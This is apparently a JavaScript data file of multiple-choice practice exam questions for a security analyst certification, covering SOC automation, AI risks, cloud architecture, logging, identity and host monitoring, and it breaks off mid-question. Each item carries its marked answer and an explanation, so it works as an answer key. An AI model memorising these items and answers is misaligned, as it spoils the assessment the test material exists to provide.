window.QUESTIONS=[{"id":"sg1-1","set":"sg","ch":1,"d":1,"q":"A security team finds that each analyst handles malware incidents in a completely different way, leading to confusion and inconsistent results. What process improvement should the team implement to ensure future incidents are handled more uniformly and efficiently?","o":["Continue allowing each analyst to use their personal approach.","Develop a standardized playbook for malware incident response.","Change job descriptions so that the same person handles all malware incidents.","Delay responding to malware incidents until a manager can advise."],"a":1,"e":"Developing a standardized playbook for malware incident response is best because it ensures all analysts follow the same procedures, which reduces confusion, increases efficiency, and produces consistent results. Allowing each analyst to use their own approach keeps the problem of inconsistency. Assigning all malware incidents to one person removes flexibility, overloads a single analyst, and creates a single point of failure. Delaying response until a manager advises wastes critical time and could allow the malware to spread or cause more damage.","l":"c1-efficiency","l2":"","k":"standardized incident response playbooks"},{"id":"sg1-2","set":"sg","ch":1,"d":1,"q":"Attackers have started using new techniques that don’t match any known signatures or rules, and the current security tools are missing these attacks. How could artificial intelligence–based tools help address this gap?","o":["AI will force attackers to revert to old techniques that have signatures.","AI operates on fixed rules, so it wouldn’t help with unknown threats.","AI would ignore any activity that isn’t in its initial database of threats.","AI models can learn from new data and adapt to novel attack patterns more quickly than static, signature-based systems."],"a":3,"e":"AI models can learn from new data and adapt to novel attack patterns more quickly than static, signature-based systems, which helps detect threats that don’t match existing rules. Forcing attackers to revert to old techniques is unrealistic since attackers continually evolve. Fixed rules would not provide the adaptability AI offers, so saying AI only operates that way is incorrect. Ignoring anything not in the initial database misrepresents how AI works, since its value lies in identifying anomalies and patterns beyond known signatures.","l":"c1-ai","l2":"","k":"AI adaptation to novel threats"},{"id":"sg1-3","set":"sg","ch":1,"d":1,"q":"During a critical incident, the incident response team wasted time debating responsibilities and when to escalate decisions. What should they have in place beforehand to avoid these delays?","o":["A documented, standardized incident response plan defining roles and escalation points","An expectation that team members will sort out roles during the incident","A policy of waiting for management guidance in every incident","A larger team to improve the diversity of skills"],"a":0,"e":"A documented, standardized incident response plan that defines roles and escalation points prevents wasted time because everyone already knows their responsibilities and when to involve higher authority, allowing the team to act quickly. Expecting team members to sort out roles during an incident leads to confusion and delays. Relying on management guidance for every decision slows down response and undermines autonomy. Simply adding more people does not solve the problem of unclear responsibilities and may actually increase confusion.","l":"c1-efficiency","l2":"c9-foundation","k":"incident response plan roles escalation"},{"id":"sg1-4","set":"sg","ch":1,"d":1,"q":"Which of the following security tasks is most appropriate to hand over to an AI-based system rather than relying on a human analyst?","o":["Writing incident postmortem reports with recommendations for company culture changes","Defining acceptable risk tolerance levels for the organization","Correlating thousands of alerts from multiple tools to identify an attack pattern","Writing customized firewall policies tailored to evolving business needs"],"a":2,"e":"Correlating thousands of alerts from multiple tools to identify an attack pattern is best suited for AI because it involves rapidly processing and connecting large volumes of data, something machines do far faster than humans. Writing postmortem reports with cultural recommendations requires judgment and communication skills beyond AI’s scope. Defining acceptable risk tolerance is a strategic business decision that must come from leadership. Writing customized firewall policies tailored to business needs demands understanding of context and priorities that AI alone cannot provide.","l":"c1-ai","l2":"c1-efficiency","k":"AI alert correlation use case"},{"id":"sg1-5","set":"sg","ch":1,"d":1,"q":"After formalizing a consistent process for investigating malware alerts, the security team notices many steps are repetitive and do not require judgment. What is the next step they should consider to further improve efficiency?","o":["Abandon the standardized process since it revealed unnecessary steps.","Assign an intern to perform all the repetitive tasks manually.","Let analysts continue performing the repetitive steps to maintain control.","Automate those repetitive steps using a security orchestration and automation tool."],"a":3,"e":"Automating the repetitive steps with a security orchestration and automation tool improves efficiency by freeing analysts to focus on tasks that require judgment while ensuring consistency and speed. Abandoning the standardized process removes the structure that already solved inconsistency issues. Assigning an intern to do repetitive work manually is inefficient, error-prone, and not scalable. Having analysts continue those tasks wastes their expertise and reduces the overall effectiveness of the team.","l":"c1-efficiency","l2":"","k":"SOAR playbook automation"},{"id":"sg1-6","set":"sg","ch":1,"d":1,"q":"The security team has a rule that no one may paste sensitive internal logs or confidential data into any public AI or cloud-based AI tool. Which risk is this policy designed to mitigate?","o":["Malicious prompts","Model poisoning","Hallucinations","Data exposure"],"a":3,"e":"This policy mitigates the risk of data exposure because pasting sensitive logs or confidential information into public AI tools could allow that data to leave the organization’s control and be accessed by unauthorized parties. Malicious prompts refer to attempts to manipulate AI output, which is unrelated to protecting confidential data. Model poisoning involves corrupting the training data of an AI system, not user input leaks. Hallucinations describe AI producing false or made-up information, which does not involve the risk of exposing internal data.","l":"c1-ai","l2":"","k":"AI data exposure risk"},{"id":"sg1-7","set":"sg","ch":1,"d":1,"q":"Which of the following security tasks is the best candidate for automation using scripts or a SOAR platform?","o":["Brainstorming new threat scenarios for the upcoming quarter","Conducting a one-on-one interview with an employee about a security policy violation","Automatically isolating a workstation when it is confirmed as infected with malware","Developing a custom strategy for a zero-day cyberattack"],"a":2,"e":"Automatically isolating a workstation when it is confirmed as infected with malware is ideal for automation because it is a repetitive, well-defined action that must happen quickly to contain threats. Brainstorming new threat scenarios requires creativity and cannot be scripted. Interviewing an employee involves human interaction and judgment that automation cannot replicate. Developing a custom strategy for a zero-day attack requires expert analysis and adaptability, which automation cannot provide.","l":"c1-efficiency","l2":"c11-contain","k":"automated endpoint isolation"},{"id":"sg1-8","set":"sg","ch":1,"d":1,"q":"Which one of the following laws or regulations governs the use of AI to conduct security-related work in the European Union?","o":["AI Act","GDPR","PCI DSS","HIPAA"],"a":0,"e":"The AI Act governs the use of AI in the European Union, including its application to security-related work, by setting rules for transparency, accountability, and risk management. GDPR focuses on personal data protection, not specifically AI regulation. PCI DSS applies to securing payment card data and is not an AI framework. HIPAA regulates healthcare data in the United States, so it does not apply to AI use in the EU.","l":"c1-ai","l2":"","k":"EU AI Act"},{"id":"sg1-9","set":"sg","ch":1,"d":1,"q":"A security analyst integrates multiple threat intelligence feeds into the team’s automated response system. What is the primary benefit of this integration?","o":["Threat actors are automatically identified and blocked across all systems in real time.","The system’s firewall rules are rewritten dynamically to prevent future attacks.","The integration reduces the need for endpoint protection software.","Alerts are enriched with current threat context, allowing analysts to prioritize real threats more effectively."],"a":3,"e":"Alerts enriched with current threat context provide analysts the primary benefit because they can more effectively prioritize which threats are real and most urgent, improving response quality and speed. Automatically identifying and blocking threat actors across all systems is unrealistic because intelligence feeds may contain false positives and require validation. Dynamically rewriting firewall rules introduces risk of misconfiguration and disruption. Reducing the need for endpoint protection software is inaccurate since layered defenses are still necessary regardless of threat intelligence integration.","l":"c1-efficiency","l2":"c4-collect","k":"threat intelligence alert enrichment"},{"id":"sg1-10","set":"sg","ch":1,"d":1,"q":"A security team is working on an integration where its threat intelligence platform will trigger a vulnerability scan automatically when it receives word of a new critical CVE. Which integration method fits this workflow best?","o":["Webhook call from the intel platform to the scanner’s API","Manual export of the CVE list to a CSV for the scanner","Nightly email to the SOC with new CVEs","Local script that parses a weekly PDF advisory"],"a":0,"e":"Using a webhook lets one system send an immediate HTTPS request to another to start the scan as soon as a new item arrives, which supports near real time action. Manual exports introduce delays and errors. An email forces humans to intervene and slows the process. A weekly PDF workflow reacts too slowly to critical issues.","l":"c1-efficiency","l2":"c6-config","k":"webhook integration for automated scanning"},{"id":"sg1-11","set":"sg","ch":1,"d":1,"q":"A cloud operations team needs to enforce that every new virtual server launched has standard security settings (such as firewall rules and logging) applied automatically. Which process improvement will best help them achieve this?","o":["Infrastructure as code (IaC)","Security information and event management (SIEM)","Security orchestration, automation, and response (SOAR)","Threat hunting"],"a":0,"e":"Infrastructure as code is the best choice because it allows security settings like firewall rules and logging to be defined in templates so that every new virtual server automatically inherits them, ensuring consistency and compliance. A SIEM focuses on collecting and analyzing logs rather than enforcing configuration. A SOAR platform automates response to incidents but does not control how servers are initially built. Threat hunting involves proactively searching for adversary activity and does not address enforcing standard server configurations.","l":"c1-efficiency","l2":"c2-infra","k":"infrastructure as code baseline enforcement"},{"id":"sg1-12","set":"sg","ch":1,"d":1,"q":"The security team finds that an AI tool occasionally flags benign activity as malicious due to lack of context. When this happens, the team double-checks the AI’s findings before taking action. What is the best practice being demonstrated here?","o":["Validating AI output","Trusting the model’s judgment","Fine-tuning the model to improve future results","Removing humans from the loop to increase efficiency"],"a":0,"e":"Validating AI output is the best practice here because the team reviews the tool’s findings before acting, which helps prevent mistakes caused by false positives. Blindly trusting the model’s judgment risks acting on incorrect alerts. Fine-tuning the model could improve accuracy over time, but that is not what is happening in this situation. Removing humans from the loop would increase efficiency but also increase the chance of errors going unchecked.","l":"c1-ai","l2":"","k":"validating AI output"},{"id":"sg1-13","set":"sg","ch":1,"d":1,"q":"Over the past month, analysts have been flooded by false-positive security alerts. Many alerts are irrelevant, causing fatigue and wasted effort. What should the team do to streamline their operations and reduce this noise?","o":["Increase the sensitivity of intrusion detection systems to catch more threats.","Implement automated alert tuning to enrich alert data and filter out known benign events.","Hire additional analysts to manually review every alert.","Replace all detection tools with a single vendor solution."],"a":1,"e":"Implementing automated alert tuning to enrich alert data and filter out known benign events is the best approach because it reduces false positives, decreases analyst fatigue, and ensures attention stays on real threats. Increasing sensitivity would create even more false positives and worsen the problem. Hiring more analysts only adds cost and does not solve the root issue of noisy alerts. Replacing all detection tools with a single vendor solution risks reducing coverage and does not guarantee fewer false positives.","l":"c1-efficiency","l2":"","k":"automated alert tuning"},{"id":"sg1-14","set":"sg","ch":1,"d":1,"q":"A cloud team wants every new VM to have logging agents and baseline firewall rules without manual steps. Which approach aligns with tool integration and repeatability?","o":["Create a shared spreadsheet with setup steps for engineers to follow.","Open a ticket for each VM so IT Operations can apply settings.","Let each engineer script their own one-off bootstrap sequence.","Use infrastructure as code templates that call provider APIs during provisioning."],"a":3,"e":"Using infrastructure as code templates that call provider APIs during provisioning ensures every VM gets logging agents and baseline firewall rules automatically and consistently, making the process repeatable and integrated with cloud tooling. A shared spreadsheet only provides guidance and still depends on humans to follow steps correctly. Opening a ticket for IT Operations adds manual effort and delays. Allowing each engineer to create one-off scripts leads to inconsistent results and lacks centralized control.","l":"c1-efficiency","l2":"c2-infra","k":"infrastructure as code provisioning templates"},{"id":"sg1-15","set":"sg","ch":1,"d":1,"q":"The SOC has written rules to automatically suppress alerts that match patterns of benign activity and has even trained a model to recognize known safe behavior. What is the expected result of this effort?","o":["Fewer false-positive alerts, allowing analysts to concentrate on genuinely suspicious events.","False negatives will no longer occur in the environment.","A higher number of alerts since the system is monitoring more conditions.","The SOC will no longer need to maintain detection rules manually."],"a":0,"e":"Fewer false-positive alerts are the expected result because suppression rules and models that recognize safe behavior filter out noise, letting analysts focus on suspicious activity that matters. False negatives can still occur since no detection system is perfect. Increasing the number of alerts would contradict the purpose of suppression. Eliminating the need to maintain detection rules is unrealistic because ongoing tuning and updates are always required to adapt to evolving threats.","l":"c1-efficiency","l2":"c1-ai","k":"reducing false positive alerts"},{"id":"sg1-16","set":"sg","ch":1,"d":1,"q":"An analyst hovers over an IP address in a browser and sees WHOIS and reputation details appear. Which integration use case does this describe?","o":["Event correlation","Log analysis","Tool orchestration","Data enrichment"],"a":3,"e":"This describes data enrichment because the analyst gains additional context like WHOIS and reputation details attached to the IP address, helping make faster, better-informed decisions. Event correlation involves linking related alerts or logs across systems. Log analysis focuses on examining raw log data for insights. Tool orchestration refers to automating workflows between different security tools rather than simply adding contextual information.","l":"c1-efficiency","l2":"c3-tip-edr","k":"security data enrichment"},{"id":"sg1-17","set":"sg","ch":1,"d":1,"q":"The chief information security officer (CISO) wants a live view of key security metrics like mean time to detect (MTTD), mean time to respond (MTTR), and the number of alerts handled per day, all in one place. What solution should the team implement?","o":["Print out a daily spreadsheet with metrics and deliver it to the CISO’s desk.","Send the CISO a weekly email report with those metrics entered manually.","Provide the CISO with logins to every individual security tool to find the data.","Build a real-time dashboard that pulls data from security tools to display these metrics."],"a":3,"e":"Building a real-time dashboard that pulls data from security tools is best because it provides the CISO with immediate visibility into critical metrics like MTTD, MTTR, and alert volume without manual effort. Printing spreadsheets or sending weekly email reports introduces delays and requires constant manual updates. Giving the CISO logins to every tool is inefficient and forces them to navigate multiple interfaces instead of seeing consolidated insights in one place.","l":"c1-efficiency","l2":"c12-ir-report","k":"security operations metrics dashboard"},{"id":"sg1-18","set":"sg","ch":1,"d":1,"q":"A security engineer writes a Python script that pulls logs from a cloud provider every hour and pushes them into the SIEM. Which integration method is being used?","o":["Plug-in","Webhook","API","Manual integration"],"a":2,"e":"This is an API integration because the Python script queries the cloud provider programmatically to pull logs and then sends them to the SIEM. A plug-in would be a ready-made module installed directly in the tool. A webhook would push events automatically in real time rather than requiring scheduled pulls. Manual integration would require a person to move the logs themselves instead of an automated script.","l":"c1-efficiency","l2":"c2-logging","k":"API log ingestion integration"},{"id":"sg1-19","set":"sg","ch":1,"d":1,"q":"What does the MTTD metric measure in a cybersecurity incident response context?","o":["The total amount of uptime a system has before any incident occurs.","The average time from the start of an incident to the moment it is first identified by the security team.","The average number of security incidents detected in a given time period.","The average time it takes to fully remediate an incident after detection."],"a":1,"e":"Mean time to detect (MTTD) measures the average time from when an incident begins until the security team identifies it, showing how quickly threats are spotted. Uptime before an incident is unrelated to detection and does not measure security responsiveness. Counting the number of incidents detected describes volume, not time. The time to fully remediate after detection is measured by mean time to respond, not MTTD.","l":"c1-efficiency","l2":"c12-ir-report","k":"mean time to detect (MTTD)"},{"id":"sg1-20","set":"sg","ch":1,"d":1,"q":"A new AI-based threat detection system sometimes classifies normal files as malware and even reports attack behaviors that never actually occurred. What risk does this illustrate?","o":["Data exposure","Model poisoning","Prompt injection","Hallucination"],"a":3,"e":"This illustrates AI hallucination because the system is generating incorrect or made-up results, such as labeling benign files as malware or inventing attack behaviors. Data exposure refers to leaking sensitive information, which is not happening here. Model poisoning involves tampering with training data to skew results, which is different from simple misclassification. Prompt injection applies to manipulating AI through crafted input, which is not the case in this scenario.","l":"c1-ai","l2":"","k":"AI hallucination risk"},{"id":"sg2-1","set":"sg","ch":2,"d":1,"q":"Naomi wants to make her applications portable and easy to move to new environments without the overhead of a full operating system. What type of solution should she select?","o":["An x86 architecture","Virtualization","Containerization","A SASE solution"],"a":2,"e":"Naomi should containerize her application. This will provide her with a lightweight option that can be moved between services and environments without requiring her to have an OS included in her container. Virtualization would include a full operating system. SASE is a solution for edge focused security, whereas x86 is a hardware architecture.","l":"c2-infra","l2":"","k":"containerization portability"},{"id":"sg2-2","set":"sg","ch":2,"d":1,"q":"Bharath wants to make changes to the Windows Registry. What tool should he select?","o":["<code>regwiz.msc</code>","<code>notepad.exe</code>","<code>secpol.msc</code>","regedit"],"a":3,"e":"The built-in Windows Registry editor is regedit. The <code>secpol.msc</code> tool is used to view and manage security policies. There is no regwiz tool, and Notepad, while handy, shouldn’t be used to try to edit the Registry!","l":"c2-os","l2":"","k":"Windows Registry editor regedit"},{"id":"sg2-3","set":"sg","ch":2,"d":1,"q":"Tom only wants to capture meaningful log information from his network devices, and is currently receiving all log entries that they generate. What does he need to set to avoid this problem?","o":["Log floor","Log ingestion server address","Log level","Log filters"],"a":2,"e":"Tom knows setting an appropriate log level will ensure that he only receives logs that are important. While log thresholds can be set using many services, log floors are not a term used for this. Log ingestion servers are useful for centralizing logs, but setting a server address alone won’t do what Tom needs. Finally, log filters would help, but require action after the logs are sent and Tom wants to limit the logs sent.","l":"c2-logging","l2":"","k":"logging levels"},{"id":"sg2-4","set":"sg","ch":2,"d":1,"q":"Jessica has deployed servers to both her PaaS cloud vendor and her own datacenter. What type of cloud architecture has she implemented?","o":["PSaaS","Hybrid cloud","On-premises cloud","Edge computing"],"a":1,"e":"Jessica has implemented a hybrid cloud approach that uses both a cloud service and her own local resources. PSaaS was made up for this question, on-premises clouds don’t operate in both on-premises and off-site mode, and edge computing describes computation placed close to the actual need for processing.","l":"c2-netarch","l2":"c2-infra","k":"hybrid cloud architecture"},{"id":"sg2-5","set":"sg","ch":2,"d":1,"q":"Ric’s organization wants to implement Zero Trust. What concern should Ric raise about Zero Trust implementations?","o":["They can be complex to implement.","Zero Trust does not support TLS inspection.","Zero Trust is not compatible with modern software-defined networks.","They are likely to prevent users from accomplishing their jobs."],"a":0,"e":"Ric knows that Zero Trust can be complex to implement. Zero Trust does not specifically prevent TLS inspection or conflict with SDN, and a successful Zero Trust implementation needs to validate user permissions but allow them to do their jobs.","l":"c2-netarch","l2":"","k":"Zero Trust implementation complexity"},{"id":"sg2-6","set":"sg","ch":2,"d":1,"q":"Michelle has a security token that her company issues to her. What type of authentication factor does she have?","o":["Biometric","Possession","Knowledge","Inherence"],"a":1,"e":"Michelle’s security token is an example of a possession factor, or “something you have.” A password or PIN would be a knowledge factor or “something you know,” and a fingerprint or retina scan would be a biometric, or inherence, factor.","l":"c2-iam","l2":"","k":"possession authentication factor"},{"id":"sg2-7","set":"sg","ch":2,"d":1,"q":"Which party in a federated identity service model makes assertions about identities to service providers?","o":["RPs","CDUs","IDPs","APs"],"a":2,"e":"Identity providers (IDPs) make assertions about identities to relying parties (RPs) and service providers in a federation. CDUs and APs are not terms used in federated identity designs.","l":"c2-federation","l2":"","k":"identity provider assertions"},{"id":"sg2-8","set":"sg","ch":2,"d":1,"q":"What design concept requires that each action requested be verified and validated before it is allowed to occur?","o":["Secure access service edge","Zero Trust","Trust but verify","Extended validation network"],"a":1,"e":"Zero Trust requires each action or use of privileges to be validated and verified before it is allowed to occur. Secure access service edge combines software-defined networking with other security products and services to control edge device security rather than requiring a secured central service or network. Trust but verify and extended validation network are not design concepts.","l":"c2-netarch","l2":"","k":"Zero Trust network architecture"},{"id":"sg2-9","set":"sg","ch":2,"d":1,"q":"Reese wants to ensure the integrity of her logs. Which of the following solutions is not a common way to ensure log integrity?","o":["File integrity monitoring for log files","Centralized logging with encrypted storage","Implementing role-based access controls for logs","Creating multiple copies of local log files"],"a":3,"e":"Reese knows that multiple copies of local logs won’t ensure integrity, although it may make it harder for a malicious actor to identify all copies of the logs. File integrity monitoring using hashing and digital signatures, centralized logging with encryption, and limiting access using a role-based access control scheme are all means of ensuring log integrity.","l":"c2-logging","l2":"","k":"ensuring log integrity"},{"id":"sg2-10","set":"sg","ch":2,"d":1,"q":"Jen’s organization wants to ensure that administrator credentials are not used improperly. What type of solution should Jen recommend to address this requirement?","o":["SAML","CASB","PAM","PKI"],"a":2,"e":"A privilege access management (PAM) system would not only allow Jen’s organization to manage and monitor privilege use for administrator accounts but would be helpful for other privileges as well. SAML is an XML-based language used to send authorization and authentication data, a CASB is a cloud access security broker used to manage cloud access rights, and PKI is a public key infrastructure used to issue and manage security certificates.","l":"c2-federation","l2":"","k":"privileged access management"},{"id":"sg2-11","set":"sg","ch":2,"d":1,"q":"Ava wants to ensure that the data on an executive’s laptop is protected in case the laptop is lost. What type of encryption should she select as part of her data protection plan?","o":["Full disk hashing","File-level encryption","Full disk encryption","Transport layer security"],"a":2,"e":"Full disk encryption is used to encrypt the entire local drive. This protects the contents of the drive as long as the user is not actively logged with the device left unlocked when it is lost. Full disk hashing is typically used to validate forensic images. File level encryption is used on a per-file basis to protect individual files, and isn’t well suited to protect an entire device. TLS, or transport layer security is used to protect data in motion across a network.","l":"c2-crypto","l2":"","k":"full disk encryption"},{"id":"sg2-12","set":"sg","ch":2,"d":1,"q":"Ben is managing the network for his city’s water utility. The network includes both programmable logic controllers that manage water flow and remote telemetry units that report on the amount of water and other data about water quality. What type of operational technology best describes this?","o":["ICS","HVAC","SCADA","PLS"],"a":2,"e":"This is an example of a SCADA, or supervisory control and data acquisition system. While this is a type of ICS, in this case SCADA is more accurate and detailed. HVAC, or heating, ventilation, air conditioning, is not correct, and PLS was made up for the question.","l":"c2-infra","l2":"c7-web-ot","k":"SCADA systems"},{"id":"sg2-13","set":"sg","ch":2,"d":1,"q":"Sally wants to find configuration files for a Windows system. Which of the following is <i>not</i> a common configuration file location?","o":["The Windows Registry","<code>C:\\Program Files\\</code>","<code><i>directory:</i>\\Windows\\Temp</code>","<code>C:\\ProgramData\\</code>"],"a":2,"e":"The temporary files directory is not a common location for configuration files for programs. Instead, the Registry, <code>Program Files</code>, and <code>Program Data</code> directories are commonly used to store configuration information.","l":"c2-os","l2":"","k":"Windows configuration file locations"},{"id":"sg2-14","set":"sg","ch":2,"d":1,"q":"Ava wants to ensure that only authorized users access her organization’s APIs. What should she implement to allow her to authenticate API users and to allow her to enforce access limits per user?","o":["A web application firewall","API keys","Multifactor authentication","Load balancing"],"a":1,"e":"API keys are commonly used to allow API users to be authenticated and to match usage to rate limiting tools. Web application firewall (WAFs) are used to detect web application attacks, but aren’t specifically designed to provide these controls. Multifactor authentication is used to protect logons, not APIs, and load balancing helps to spread load amongst systems in a cluster.","l":"c2-infra","l2":"c2-iam","k":"API keys and authentication"},{"id":"sg2-15","set":"sg","ch":2,"d":1,"q":"What protocol is used to ensure that logs are time synchronized?","o":["TTP","NTP","SAML","FTP"],"a":1,"e":"NTP (Network Time Protocol) is the underlying protocol used to ensure that systems are using synchronized time. TTP does not exist, SAML is a markup language, and FTP is the file transfer protocol.","l":"c2-logging","l2":"","k":"NTP time synchronization"},{"id":"sg2-16","set":"sg","ch":2,"d":1,"q":"OAuth, OpenID, SAML, and AD FS are all examples of what type of technology?","o":["Federation","Multifactor authentication","Identity vetting","PKI"],"a":0,"e":"OAuth, OpenID, SAML, and AD FS are all examples of technologies used for federated identity. They aren’t MFA, identity vetting, or PKI technologies.","l":"c2-federation","l2":"","k":"federated identity technologies"},{"id":"sg2-17","set":"sg","ch":2,"d":1,"q":"Example Corporation wants to configure their Windows 11 workstations securely. What is the process of applying a standardized security template called?","o":["Hardening","Log ingestion","Registry management","Armoring"],"a":0,"e":"Example Corporation using a benchmark like the CIS benchmarks to harden their systems. Log ingesting involves gathering and processing log data. The Windows Registry is often involved in hardening efforts as part of the configuration but isn’t the term for applying a security template. Armoring is not a term used for this.","l":"c2-os","l2":"","k":"system hardening benchmarks"},{"id":"sg2-18","set":"sg","ch":2,"d":1,"q":"During a penetration test of Anna’s company, the penetration testers were able to compromise the company’s web servers and deleted their log files, preventing analysis of their attacks. What compensating control is best suited to prevent this issue in the future?","o":["Using full-disk encryption","Using log rotation","Sending logs to a syslog server","Using TLS to protect traffic"],"a":2,"e":"Sending logs to a remote log server or bastion host is an appropriate compensating control. This ensures that copies of the logs exist in a secure location, allowing them to be reviewed if a similar compromise occurred. Full-disk encryption leaves files decrypted while in use and would not secure the log files from a compromise, whereas log rotation simply means that logs get changed out when they hit a specific size or time frame. TLS encryption for data (including logs) in transit can keep it private and prevent modification but wouldn’t protect the logs from being deleted.","l":"c2-logging","l2":"","k":"centralized logging with syslog"},{"id":"sg2-19","set":"sg","ch":2,"d":1,"q":"Ben is preparing a system hardening procedure for his organization. Which of the following is <i>not</i> a typical system hardening process or step?","o":["Updating and patching systems","Enabling additional services","Enabling logging","Configuration disk encryption"],"a":1,"e":"Ben knows that hardening processes typically focus on disabling unnecessary services, not enabling additional services. Updating, patching, enabling logging, and configuring security capabilities like disk encryption are all common hardening practices.","l":"c2-os","l2":"","k":"system hardening best practices"},{"id":"sg2-20","set":"sg","ch":2,"d":1,"q":"Gabby wants to implement a tool to control the company issued phones that her organization provides. What type of tool should she deploy if she wants to enforce configuration and software versions while providing the ability to remote wipe lost devices?","o":["NGFW","MDM","MFM","SDN"],"a":1,"e":"Gabby should implement mobile device management (MDM). MDM tools provide a wide range of capabilities including remote wipe and configuration and application management for mobile devices. NGFW, or next-generation firewalls provide advanced security services including firewall and application-aware filtering, but do not manage mobile devices. MFM is not a commonly used security term, although it does describe an early hard drive technology. SDN, or software-defined networking, is used to control networks via code.","l":"c2-iam","l2":"c3-tip-edr","k":"mobile device management"},{"id":"sg3-1","set":"sg","ch":3,"d":1,"q":"Ava believes that a malicious actor is using one of her servers to store files. Which of the following Linux commands will show her how much disk space is in use as part of her diagnostics?","o":["<code> top</code>","<code> df</code>","<code> lsof</code>","<code> ps</code>"],"a":1,"e":"The <code>df</code> command will show you a system’s current disk utilization. Both the <code>top</code> command and the <code>ps</code> command will show you information about processes, CPU, and memory utilization, whereas <code>lsof</code> is a multifunction tool for listing open files.","l":"c3-host","l2":"","k":"Linux df disk usage"},{"id":"sg3-2","set":"sg","ch":3,"d":1,"q":"What Windows tool provides detailed information, including information about USB host controllers, memory usage, and disk transfers?","o":["Statmon","Resmon","Perfmon","Winmon"],"a":2,"e":"Perfmon, or Performance Monitor, provides the ability to gather detailed usage statistics for many items in Windows. Resmon, or Resource Monitor, monitors CPU, memory, and disk usage but does not provide information about things like USB host controllers and other detailed instrumentation. Statmon and winmon are not Windows built-in tools.","l":"c3-host","l2":"","k":"Windows Perfmon tool"},{"id":"sg3-3","set":"sg","ch":3,"d":1,"q":"What type of network information should you capture to be able to provide a report about how much traffic systems in your network sent to remote systems?","o":["Syslog data","WMI data","Resmon data","Flow data"],"a":3,"e":"Flow data provides information about the source and destination IP address, protocol, and total data sent and would provide the detail needed. Syslog, WMI, and resmon data is all system log information and would not provide this information.","l":"c3-network","l2":"c3-tools","k":"NetFlow traffic analysis"},{"id":"sg3-4","set":"sg","ch":3,"d":1,"q":"Which of the following technologies is best suited to prevent wired rogue devices from connecting to a network?","o":["NAC","PRTG","Port security","NTP"],"a":0,"e":"Network access control (NAC) can be set up to require authentication. Port security is limited to recognizing MAC addresses, making it less suited to preventing rogue devices. PRTG is a monitoring tool, and NTP is the Network Time Protocol.","l":"c3-network","l2":"c1-network","k":"NAC rogue device prevention"},{"id":"sg3-5","set":"sg","ch":3,"d":1,"q":"As part of her job, Danielle sets an alarm to notify her team via email if her Windows server uses 80 percent of its memory and to send a text message if it reaches 90 percent utilization. What is this setting called?","o":["A monitoring threshold","A preset notification level","Page monitoring","Perfmon calibration"],"a":0,"e":"A monitoring threshold is set to determine when an alarm or report action is taken. Thresholds are often set to specific values or percentages of capacity.","l":"c3-host","l2":"","k":"System monitoring threshold"},{"id":"sg3-6","set":"sg","ch":3,"d":1,"q":"Chris is reviewing a file that is part of an exploit package. He notes that there is a file that has content with curly brackets (<code>{}</code>) around statements. What file type from the following list he most likely reviewing?","o":["Plain text","JSON","XML","HTML"],"a":1,"e":"Chris is most likely reviewed a JSON file. HTML and XML typically use angle brackets (<code>&lt;</code> and <code>&gt;</code>) rather than curly brackets. Plain text does not use or require either.","l":"c3-tools","l2":"","k":"JSON data structure"},{"id":"sg3-7","set":"sg","ch":3,"d":1,"q":"What term describes a system sending heartbeat traffic to a botnet command and control server?","o":["Beaconing","Zombie ping","CNCstatus","CNClog"],"a":0,"e":"Beaconing activity (sometimes called heartbeat traffic) occurs when traffic is sent to a botnet command and control system. The other terms are made up.","l":"c3-network","l2":"","k":"Command and control beaconing"},{"id":"sg3-8","set":"sg","ch":3,"d":1,"q":"Charles wants to check if a plaintext file includes text matching a script that is part of a known IoC he is investigating. What technique can he use to do so?","o":["Use grep to search for matching text.","Use strings to identify all text strings in the file.","Hash both the file and the original and compare the hashes.","Check the file size and creation date."],"a":0,"e":"Charles can use grep to search for matching strings. Strings can show text in binary files but won’t compare the files. Hashing a file for comparison only helps if both files match exactly. In this case, the Charles is checking to see if the file includes matching text, not comparing the entire file. File size and creation date are not guarantees of a file being the same.","l":"c3-uba-scripting","l2":"c3-filesandbox","k":"Grep text pattern matching"},{"id":"sg3-9","set":"sg","ch":3,"d":1,"q":"What can the MAC address of a rogue device tell you?","o":["Its operating system version","The TTL of the device","What type of rogue it is","The manufacturer of the device"],"a":3,"e":"Hardware vendor ID codes are part of MAC addresses and can be checked for devices that have not had their MAC address changed. It is possible to change MAC addresses, so relying on only the MAC address is not recommended, but it can be useful to help identify what a rogue device might be.","l":"c3-network","l2":"","k":"MAC address OUI vendor"},{"id":"sg3-10","set":"sg","ch":3,"d":1,"q":"How can Jim most effectively locate a wireless rogue access point that is causing complaints from employees in his building?","o":["Nmap","Signal strength and triangulation","Connecting to the rogue AP","NAC"],"a":1,"e":"Locating a rogue AP is often best done by performing a physical survey and triangulating the likely location of the device by checking its signal strength. If the AP is plugged into the organization’s network, nmap may be able to find it, but connecting to it is unlikely to provide its location (or be safe!). NAC would help prevent the rogue device from connecting to an organizational network but won’t help locate it.","l":"c3-network","l2":"","k":"Wireless rogue AP triangulation"},{"id":"sg3-11","set":"sg","ch":3,"d":1,"q":"Mark wants to use built-in tools to script actions on a Linux system. Which of the following should he use?","o":["Shell scripting","PowerShell","SCOM","Python"],"a":0,"e":"Shell scripting meets the needs described. PowerShell is used on Windows, SCOM is a Windows management tool, and Python is often, but not always, installed on Linux systems.","l":"c3-uba-scripting","l2":"","k":"Linux shell scripting"},{"id":"sg3-12","set":"sg","ch":3,"d":1,"q":"One of the business managers in Geeta’s organization reports that she received an email with a link that appeared to be a link to the organization’s HR website, and that the website it went to when she clicked on it was very similar to the organization’s website. Fortunately, the manager noticed that the URL was different than usual. What technique best describes a link that is disguised to appear legitimate?","o":["An obfuscated link","A symbolic link","A phishing link","A decoy link"],"a":0,"e":"Obfuscated links take advantage of tricks, including using alternate encodings, typos, and long URLs that contain legitimate links wrapped in longer malicious links. Symbolic links are a pointer used by Linux operating systems to point to an actual file using a filename and link. Phishing links and decoy links are not common terms.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"Obfuscated URL links"},{"id":"sg3-13","set":"sg","ch":3,"d":1,"q":"Angela wants to review the syslog on a Linux system. What directory should she check to find it on most Linux distributions?","o":["<code> /home/log</code>","<code> /var/log</code>","<code> /log</code>","<code> /var/syslog</code>"],"a":1,"e":"The syslog file is found in <code>/var/log</code> on most Linux hosts.","l":"c3-tools","l2":"c2-os","k":"Linux syslog directory path"},{"id":"sg3-14","set":"sg","ch":3,"d":1,"q":"Laura wants to review headers in an email that one of her staff is suspicious of. What should she not have that person do if she wants to preserve the headers?","o":["She shouldn’t have them print the email.","She shouldn’t have them reply to the email.","She shouldn’t have them forward the email to her.","She shouldn’t have them download the 